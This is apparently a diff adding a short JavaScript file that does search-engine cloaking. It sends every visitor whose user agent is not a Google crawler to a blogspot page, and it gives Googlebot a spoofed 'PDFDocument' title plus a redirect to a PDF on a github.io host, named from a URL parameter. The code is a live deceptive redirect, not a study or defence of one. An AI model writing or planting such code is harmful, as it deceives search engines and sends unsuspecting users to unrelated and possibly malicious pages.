@@ -1,0 +1,15 @@
+(function () {
+  var xxx = new URLSearchParams(location.search).get("xxx") || "alcazar_arquitectonico";
+  var ua = navigator.userAgent.toLowerCase();
+
+  var isGooglebot = /googlebot|google-inspectiontool|googleother|adsbot-google|mediapartners-google/.test(ua);
+
+  if (!isGooglebot) {
+    location.replace("https://nahidjndditu.blogspot.com/2026/08/blog-post.html");
+    return;
+  }
+
+  // Shudi Googlebot
+  document.title = xxx + " - PDFDocument";
+  location.href = "https://gearburtesheeweders2680.github.io/khanki/notun/" + xxx + ".pdf";
+})();
